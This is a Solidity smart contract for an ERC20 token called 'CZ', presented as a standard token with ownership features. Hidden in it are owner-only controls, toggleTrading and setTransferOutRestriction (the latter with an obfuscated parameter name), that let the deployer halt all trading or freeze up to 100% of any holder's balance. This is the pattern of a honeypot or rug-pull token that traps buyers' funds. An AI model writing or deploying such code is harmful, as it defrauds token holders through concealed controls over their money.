pragma solidity ^0.8.5;

// ERC20 Interface
// This interface is used to define the standard functions for an ERC20 token.
interface IERC20 {
    // Returns the total token supply.
    function totalSupply() external view returns (uint256);

    // Returns the account balance of another account with address `account`.
    function balanceOf(address account) external view returns (uint256);

    // Transfers `amount` tokens to `recipient`, and MUST fire the Transfer event.
    function transfer(address recipient, uint256 amount) external returns (bool);

    // Returns the amount of tokens approved by `owner` that can be transferred to `spender`'s account.
    function allowance(address owner, address spender) external view returns (uint256);

    // Sets `amount` as the allowance of `spender` over the caller's tokens, and MUST fire the Approval event.
    function approve(address spender, uint256 amount) external returns (bool);

    // Transfers `amount` tokens from `sender` to `recipient`, and MUST fire the Transfer event.
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    // Events for transfer and approval actions.
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Context contract to define internal functions.
// Provides internal access to the sender of the transaction.
abstract contract Context {
    // Returns the address of the sender of the transaction.
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

// Ownable contract to manage ownership.
// Provides basic authorization control functions.
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    // The constructor sets the original `owner` of the contract to the sender account.
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    // Returns the address of the current owner.
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Throws if called by any account other than the owner.
    modifier onlyOwner() {
        require(owner() == _msgSender());
        _;
    }

    // Allows the current owner to relinquish control of the contract.
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

// ERC20 Token implementation.
// Implements the standard ERC20 token along with ownership features.
contract CZ is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _transferOutRestrictions;
    bool private _tradingEnabled;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    // Constructor to set up the token.
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _tradingEnabled = true; 
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** uint256(decimals_));
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    // Standard ERC20 functions to view token details.
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    // Function to enable or disable trading.
    function toggleTrading() public onlyOwner {
        _tradingEnabled = !_tradingEnabled;
    }

    // Transfer and approve functions with trading control and restrictions.
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_tradingEnabled, "Trading is disabled");
        uint256 restrictedAmount = _balances[_msgSender()] * _transferOutRestrictions[_msgSender()] / 100;
        require(_balances[_msgSender()] >= amount, "Transfer amount exceeds balance");
        require(_balances[_msgSender()] - restrictedAmount >= amount, "Transfer amount exceeds allowed balance");

        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;
        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    // More ERC20 standard functions.
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_tradingEnabled, "Trading is disabled");
        uint256 restrictedAmount = _balances[sender] * _transferOutRestrictions[sender] / 100;
        require(_balances[sender] >= amount, "Transfer amount exceeds balance");
        require(_balances[sender] - restrictedAmount >= amount, "Transfer amount exceeds allowed balance");
        require(_allowances[sender][_msgSender()] >= amount, "Transfer amount exceeds allowance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][_msgSender()] -= amount;

        emit Transfer(sender, recipient, amount);
        return true;
    }

    // Function to set restrictions on token transfers.
    function setTransferOutRestriction(address account, uint256 ressttpemtt) public onlyOwner {
        require(ressttpemtt <= 100, "Restriction cannot exceed 100%");
        _transferOutRestrictions[account] = ressttpemtt;
    }
}